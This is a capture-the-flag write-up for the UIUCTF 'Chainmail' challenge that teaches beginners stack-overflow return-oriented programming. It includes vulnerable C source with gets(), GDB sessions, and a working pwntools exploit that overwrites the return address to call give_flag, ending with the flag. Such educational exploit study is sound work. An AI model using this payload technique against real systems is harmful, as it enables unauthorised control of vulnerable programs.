# Chainmail

### ROP for Absolute Beginners

The description for this challenge is as follows: 

*I've come up with a winning idea to make it big in the Prodigy and Hotmail scenes (or at least make your email widespread)!*

*nc chainmail.chal.uiuc.tf 1337*

*Author: Emma*

This was a pretty straightforward challenge in the pwn category, and as such, it accrued 256 solves over the course of the competition. As a result, I'll spend a lot of this writeup focusing on basic topics like reverse engineering for pwn challenges, debugging, and leveraging pwntools while gaining a decent understanding of fundamental concepts in binary exploitation. The challenge binary, C source code, and a Dockerfile were all provided in the original challenge. 

**TL;DR Solution:** Note that the function "gets" is used place user input into a stack variable, which causes a stack overflow and allows you to overwrite the return pointer. You can then attempt to directly overwrite the return pointer with the "give_flag" function already present in the binary; however, I ran into a stack alignment issue on my local system which necessitated the addition of an extra ret instruction before the call to give_flag. This then gave the flag.

## Finding the Vulnerability

One of the easiest first steps in finding a possible vulnerability in a binary exploitation is to run the challenge binary or connect to the netcat connection and give the program input likely to produce interesting results. This particular program simply seems to ask for a name, then print it out followed by some additional theming text. I started my input with some %p's to test for a format string vulnerability, then just held down the a button on my keyboard to get a long input. The output ended with the words "Segmentation Fault"; this was not printed as part of the program's normal operations, but is instead an indicator that the program encountered something that did not allow it to continue running normally and is a very good indicator that something about my input triggered this response.

```
┌─[✗]─[knittingirl@knittingirl-virtualbox]─[~/CTF/uiuctf23]
└──╼ $./chal
Hello, welcome to the chain email generator! Please give the name of a recipient: %p%paaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Okay, here's your newly generated chainmail message!

Hello %p%paaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,
Have you heard the news??? Send this email to 10 friends or else you'll have bad luck!

Your friend,
Jim
Segmentation fault
```

Next, I can further investigate the program by looking at the source code. The code is very simple; there is a main function in which all of the visible action seems to be happening, and a give_flag function that is not used during the course of normal operations, but which will seemingly print of the flag if called. The core vulnerability is on line 27, with gets(name);. The name variable is a local variable, i.e. it's defined within the function, and it is a 64-byte long character array. The issue with the gets function is that it will continue to take user input even after that 64-byte array has been exhausted, allowing a malicious user (me) to freely overwrite any data placed higher up on the stack. Of particular interest is the return pointer. In x86 architectures, whenever a function is called, the address to which operations should return following that function's completion is stored in the return pointer. The return pointer is placed on the stack, above any and all local variables for the function. This means that if I have an unlimited overflow into a local variable, I can edit the return pointer to be whatever address I would like; this includes the address of the give_flag function.
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void give_flag() {
    FILE *f = fopen("/flag.txt", "r");
    if (f != NULL) {
        char c;
        while ((c = fgetc(f)) != EOF) {
            putchar(c);
        }
    }
    else {
        printf("Flag not found!\n");
    }
    fclose(f);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    char name[64];
    printf("Hello, welcome to the chain email generator! Please give the name of a recipient: ");
    gets(name);
    printf("Okay, here's your newly generated chainmail message!\n\nHello %s,\nHave you heard the news??? Send this email to 10 friends or else you'll have bad luck!\n\nYour friend,\nJim\n", name);
    return 0;
}
```
As a quick aside, in a lot of challenges, you would only be provided with the challenge binary. You can still derive source code-like output with a decompiler like Ghidra (this is free and open source), so to give you an idea of what that looks like, here's a screenshot of its output on my machine. It isn't perfect; for instance, the local variable's name isn't reproduced, but this output is still very readable, and the issue with the gets function is readily diagnosable.
![image](https://github.com/knittingirl/CTF-Writeups/assets/10614967/3fff0461-3016-46f4-9341-18018e90109c)

## Debugging and Writing an Exploit

At this point, it's time to start writing a solve script. I'm a big fan of the Python pwntools library, which provides a good way to interact with both local binaries and remote network connections, a way to send and receive data easily, including non-ascii data, as well as some convenient ways to tie in debugging with GDB (note: I have the GEF wrapper for GDB to make it display pretty data automatically, would recommend getting GEF or similar). In the Python script below, I import the pwntools library, I set it up to run the local chal binary, and also set up GDB to attach with some specified commends to run automatically; b*main+179 will set a breakpoint on the ret instruction at the end of the main function, which is where the edited return address will be readily visible, and which I determined by using gdb on the chal binary and issuing the command "disas main" (short for disassemble), the output of which is also provided below.

After the script receives the text asking the user to provide a name, it sends back a 100 byte-long cyclic pattern. The cyclic function is another feature of pwntools that produces a non-repeating ascii pattern; the idea is that you can use the debugger, determine which bit of the pattern has overwritten your target (in our case, the return pointer), and determine its offset in order to determine an appropriate length of padding.

```
from pwn import *

target = process('./chal')

pid = gdb.attach(target, 'b *main+179\ncontinue')
#target = remote('chainmail.chal.uiuc.tf', 1337)

print(target.recvuntil(b'recipient'))

payload = cyclic(100)

target.sendline(payload)

target.interactive()
```
```
┌─[✗]─[knittingirl@knittingirl-virtualbox]─[~/CTF/uiuctf23]
└──╼ $gdb ./chal
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
...
(No debugging symbols found in ./chal)
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000401288 <+0>:	endbr64 
   0x000000000040128c <+4>:	push   rbp
   0x000000000040128d <+5>:	mov    rbp,rsp
...
   0x0000000000401315 <+141>:	call   0x401100 <gets@plt>
   0x000000000040131a <+146>:	lea    rax,[rbp-0x40]
   0x000000000040131e <+150>:	mov    rsi,rax
   0x0000000000401321 <+153>:	lea    rax,[rip+0xd58]        # 0x402080
   0x0000000000401328 <+160>:	mov    rdi,rax
   0x000000000040132b <+163>:	mov    eax,0x0
   0x0000000000401330 <+168>:	call   0x4010e0 <printf@plt>
   0x0000000000401335 <+173>:	mov    eax,0x0
   0x000000000040133a <+178>:	leave  
   0x000000000040133b <+179>:	ret    
End of assembler dump.
gef➤ 
```
If I run my python script, I'll get a debugger window that I can use to find the offset of my return pointer. I use x/s $rsp to get the contents of the rsp register as a string; on the ret instruction, the program is trying to return to the contents of rsp, which is causing a Segmentation Fault in our case because the first eight bytes of the string are unmapped memory. 
```
     0x401330 <main+168>       call   0x4010e0 <printf@plt>
     0x401335 <main+173>       mov    eax, 0x0
     0x40133a <main+178>       leave  
 →   0x40133b <main+179>       ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal", stopped 0x40133b in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40133b → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  x/s $rsp
0x7fff7ca9a758:	"saaataaauaaavaaawaaaxaaayaaa"
gef➤  
```
Then to get the offset, I typically just open up a python shell as follows:
```
>>> from pwn import *
cyclic(100[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/knittingirl/.cache/.pwntools-cache-3.8/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
)[*] A newer version of pwntools is available on pypi (4.8.0 --> 4.10.0).
    Update with: $ pip install -U pwntools
>>> cyclic(100).find(b"saaataaauaaavaaawaaaxaaayaaa")
72
```
Finally, pwntools provides an automated way to get the address of the give_flag function (we could also get the address in Ghidra, GEF, or similar and copy-paste it in, but this is slightly faster!). Basically, I set up a padding of 72 a's, then append the address of give_flag as pwntools has automatically parsed it from the chal binary. I also run this give_flag address through the p64 pwntools function, which converts the integer into an 8-character bytestring that will convert to the address in little endian (the lowest value byte is earliest in the byte string, i.e. p64(0x0102030405060708) = b'\x08\x07\x06\x05\x04\x03\x02\x01')), which is used by most mainstream architectures, including x86/x86-64.
```
elf = ELF('chal')
padding = b'a' *72
payload = padding + p64(elf.symbols['give_flag'])
```
### Stack Alignment Issues:

Now, if I run the program with the new payload, it initially all looks good. I'm returning into the give_flag function.
```
     0x401330 <main+168>       call   0x4010e0 <printf@plt>
     0x401335 <main+173>       mov    eax, 0x0
     0x40133a <main+178>       leave  
 →   0x40133b <main+179>       ret    
   ↳    0x401216 <give_flag+0>    endbr64 
        0x40121a <give_flag+4>    push   rbp
        0x40121b <give_flag+5>    mov    rbp, rsp
        0x40121e <give_flag+8>    sub    rsp, 0x10
        0x401222 <give_flag+12>   lea    rax, [rip+0xddf]        # 0x402008
        0x401229 <give_flag+19>   mov    rsi, rax
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chal", stopped 0x40133b in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x40133b → main()
────────────────────────────────────────────────────────────────────────────────
gef➤
```
Then I step forward until the call to fopen, at which point execution seems to get stuck on a movaps instruction in libc. (Brief aside; I'm debugging on a Parrot VM that still uses libc 2.31. This is different from the Ubuntu 22.04 distro used in the Dockerfile, but this challenge is simple enough that using a different library doesn't really matter, but your exact errors may vary by distro!)
```
 → 0x7f61e071f540                  movaps XMMWORD PTR [rsp+0x10], xmm1
```
Basically, this is a fairly well-known issue with the x86-64 architecture when attempting this type of attack. Certain libc functions, including fopen apparently, require that the stack be aligned along a certain 16 bytes, otherwise it will error out. Because of how our exploit, which is basically a very simple form of return oriented programming/ROP, works, it is very possible for your 8-byte address to come halfway through the 16-byte stack alignment and cause these types of errors. Fortuntely, the solution is fairly simple. You just need to add another address between the padding and the give_flag address, which needs to end with a ret and is preferrably quite simple (i.e. just a ret instruction). The program will then jump to the first address, return into the second address, then give the flag. You can essentially chain an unlimited quantity of these types of addresses, known as gadgets, to perform more sophisticated ROP attacks.

Using all of this information, I can then put together a final payload. I simply use the address of main+179 as my padding gadget, since we already determined that that was a ret instruction when setting up debugging.
```
from pwn import *

#Pwning the binary
target = process('./chal')
pid = gdb.attach(target, 'b *main+179\ncontinue')
#Pwning the actual netcat connection
#target = remote('chainmail.chal.uiuc.tf', 1337)

print(target.recvuntil(b'recipient'))
padding = b'a' *72
elf = ELF('chal')

payload = padding + p64(elf.symbols['main']+179) + p64(elf.symbols['give_flag'])

target.sendline(payload)

target.interactive()
```
If we run it locally and look at the debugger, we can see it return back to the main+179 instruction, and then back into give_flag.
```
→   0x40133b <main+179>       ret    
   ↳    0x40133b <main+179>       ret
...
[#0] 0x40133b → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  ni
...
 →   0x40133b <main+179>       ret    
   ↳    0x401216 <give_flag+0>    endbr64
```
And if we run it against the remote connection, it prints the flag!
```
┌─[knittingirl@knittingirl-virtualbox]─[~/CTF/uiuctf23]
└──╼ $python3 chain_game_payload.py 
[+] Opening connection to chainmail.chal.uiuc.tf on port 1337: Done
b'== proof-of-work: disabled ==\nHello, welcome to the chain email generator! Please give the name of a recipient'
[*] '/home/knittingirl/CTF/uiuctf23/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  b'./'
[*] Switching to interactive mode
: Okay, here's your newly generated chainmail message!

Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;\x13,
Have you heard the news??? Send this email to 10 friends or else you'll have bad luck!

Your friend,
Jim
uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}
[*] Got EOF while reading in interactive
```
Thanks for reading!
